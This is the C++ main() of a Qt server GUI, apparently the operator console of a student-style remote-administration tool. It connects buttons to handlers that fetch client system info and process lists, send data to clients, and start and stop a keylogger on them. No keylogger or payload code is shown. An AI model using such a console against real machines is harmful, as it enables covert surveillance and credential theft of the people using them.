#include "../utils/EnvLoader.hpp"
#include "../utils/LPTF/LPTF_Socket.hpp"
#include "../utils/LPTF/LPTF_Packet.hpp"
#include "ServerApp.hpp"
#include "MainWindow.hpp"

#include <QApplication>
#include <QTimer>
#include <thread>
#include <iostream>
#include <windows.h>
#include <QDebug>

/**
 * @brief Point d'entrée principal du serveur.
 * 
 * Lors du lancement, la GUI du serveur charge les informations
 * de la base de données et les rend accessibles à l'utilisateur
 * avec une distinction graphique entre les clients online et offline.
 */
int main(int argc, char *argv[])
{
    LPTF_Socket::initialize();

    QApplication app(argc, argv);
    MainWindow w;

    ServerApp *serverApp = new ServerApp("../../.env");

    // Connexions
    bool ok1 = QObject::connect(serverApp, &ServerApp::clientConnected,
                                &w, &MainWindow::onClientConnected);
    qDebug() << "connect clientConnected→onClientConnected:" << ok1;

    bool ok2 = QObject::connect(serverApp, &ServerApp::clientResponse,
                                &w, &MainWindow::onClientResponse);
    qDebug() << "connect clientResponse→onClientResponse:" << ok2;

    bool ok3 = QObject::connect(&w, &MainWindow::getInfoSys,
                                serverApp, &ServerApp::onGetInfoSys);
    qDebug() << "connect getInfoSys→onGetInfoSys:" << ok3;

    bool ok4 = QObject::connect(&w, &MainWindow::requestProcessList,
                                serverApp, &ServerApp::onRequestProcessList);
    qDebug() << "connect requestProcessList→onRequestProcessList:" << ok4;

    bool ok5 = QObject::connect(&w, &MainWindow::startKeylogger,
                                serverApp, &ServerApp::onStartKeylogger);
    qDebug() << "connect startKeylogger→onStartKeylogger:" << ok5;

    bool ok6 = QObject::connect(&w, &MainWindow::stopKeylogger,
                                serverApp, &ServerApp::onStopKeylogger);
    qDebug() << "connect stopKeylogger→onStopKeylogger:" << ok6;

    bool ok7 = QObject::connect(&w, &MainWindow::sendToClient,
                                serverApp, &ServerApp::onSendToClient);
    qDebug() << "connect sendToClient→sendToClient:" << ok7;

    bool ok8 = QObject::connect(serverApp, &ServerApp::clientDisconnected,
                                &w, &MainWindow::onClientDisconnected);
    qDebug() << "connect clientDisconnected→onClientDisconnected:" << ok8;

    bool ok9 = QObject::connect(serverApp, &ServerApp::clientsLoadedFromDatabase,
                                &w, &MainWindow::onClientsLoadedFromDatabase);
    qDebug() << "connect clientsLoadedFromDatabase→onClientsLoadedFromDatabase:" << ok9;

    QObject::connect(&app, &QApplication::aboutToQuit, serverApp, &QObject::deleteLater);

    // Thread bloquant serveur
    std::thread serverThread([serverApp]()
                             { serverApp->run(); });
    serverThread.detach();

    w.show();
    
    // Load clients from database after GUI is shown
    QTimer::singleShot(100, [serverApp]() {
        serverApp->loadClientsFromDatabase();
    });
    
    return app.exec();
}
